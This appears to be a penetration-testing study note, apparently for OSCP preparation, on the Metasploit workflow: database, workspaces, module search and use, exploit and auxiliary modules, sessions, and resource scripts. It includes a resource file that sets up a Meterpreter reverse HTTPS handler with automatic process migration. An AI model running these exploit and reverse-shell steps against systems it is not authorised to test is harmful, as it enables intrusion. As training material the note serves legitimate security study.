# Metasploit — Intro & Module Workflow

Metasploit is an exploit framework that combines **enumeration, exploitation, payload handling, session management, post-exploitation, and pivoting** behind a consistent interface.

Use it as an **optional framework path**, not as a replacement for understanding the service, vulnerability, exploit assumptions, or manual verification.

## 1. Start MSF and its database

```bash
sudo msfdb init
sudo systemctl enable postgresql   # optional: start DB automatically on boot
sudo msfconsole
```

Inside Metasploit:

```text
db_status
help
```

The database is not required to run Metasploit, but it is useful for storing hosts, services, vulnerabilities, credentials, and exploitation results.

## 2. Workspaces

Keep assessments separated:

```text
workspace
workspace -a <NAME>
workspace <NAME>
```

## 3. Populate/query the database

`db_nmap` uses normal Nmap syntax and stores the results in the Metasploit database.

```text
db_nmap -A <TARGET>
hosts
services
services -p 445
vulns
creds
loot
notes
```

Database results can also populate module options automatically:

```text
services -p 445 --rhosts
```

## 4. Core module workflow

```text
search <TERM>
search type:auxiliary smb
use <MODULE | INDEX>
info
show options
show missing
set <OPTION> <VALUE>
unset <OPTION>
check                 # when supported
run
```

Useful discovery commands:

```text
show -h
show auxiliary
show exploits
show payloads
show advanced
```

### Before running an exploit

Read `info` and confirm:

- target product/version really matches;
- platform and architecture match;
- required options are correct;
- available target/command-execution method is appropriate;
- `check` support exists and can be used first;
- side effects / artifacts-on-disk / IOC logging are understood;
- stability/reliability is acceptable;
- cleanup warnings are recorded and handled.

Do **not** blindly accept the default payload. Explicitly choose the payload and verify `LHOST`, `LPORT`, `RHOSTS`, `RPORT`, `SSL`, `TARGETURI`, and other module-specific options.

## 5. Auxiliary modules

Auxiliary modules perform operations such as scanning, protocol enumeration, password attacks, fuzzing, and sniffing.

Example pattern:

```text
search type:auxiliary smb
use auxiliary/scanner/smb/smb_version
show options
set RHOSTS <TARGET>
run
```

Results may be stored automatically and viewed with `hosts`, `services`, `vulns`, and `creds`.

## 6. Exploit modules

Exploit modules normally combine an exploit with a selected payload:

```text
search <PRODUCT / VERSION / CVE>
use <EXPLOIT_MODULE>
info
show options
check
set payload <PAYLOAD>
set RHOSTS <TARGET>
set LHOST <KALI_IP>
run
```

Metasploit automatically starts the listener required by the payload when an exploit module is launched.

## 7. Sessions vs jobs

**Session = access to a compromised target.**  
**Job = a module/listener running in the background.**

```text
sessions -l
sessions -i <ID>
sessions -k <ID>

run -j
jobs
```

Inside an interactive session, `Ctrl+Z` can background it so you can return to `msfconsole` without killing access.

## 8. Global options

`set` / `unset` affect the current module.  
`setg` / `unsetg` define values globally across modules.

```text
setg RHOSTS <TARGET>
unsetg RHOSTS
```

Use global values carefully so a stale target/listener setting is not accidentally reused.

## 9. Resource scripts (`.rc`)

Resource scripts automate repetitive Metasploit console commands and can also contain Ruby logic.

Example listener resource file:

```text
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_https
set LHOST <KALI_IP>
set LPORT 443
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
run -z -j
```

Run it with:

```bash
sudo msfconsole -r listener.rc
```

Useful concepts:

- `AutoRunScript` → automatically run a post module after a session opens.
- `ExitOnSession false` → keep the handler listening after one connection.
- `run -z -j` → run in the background and do not immediately interact with the new session.
- `show advanced` → display options such as `AutoRunScript` and `ExitOnSession`.

Built-in resource scripts are under:

```bash
/usr/share/metasploit-framework/scripts/resource/
```

Review and understand a supplied script before using it.

## OSCP mental workflow

```text
Enumeration identifies a concrete target/vulnerability
        ↓
search → use → info
        ↓
check prerequisites + side effects
        ↓
show options / show missing
        ↓
select payload explicitly
        ↓
run
        ↓
session obtained
        ↓
manage with sessions/jobs
        ↓
post-exploitation / pivot if useful
```

See also:
- [[Payloads - msfvenom - multi-handler]]
- [[Meterpreter & Post-Exploitation]]
- [[Metasploit Pivoting]]
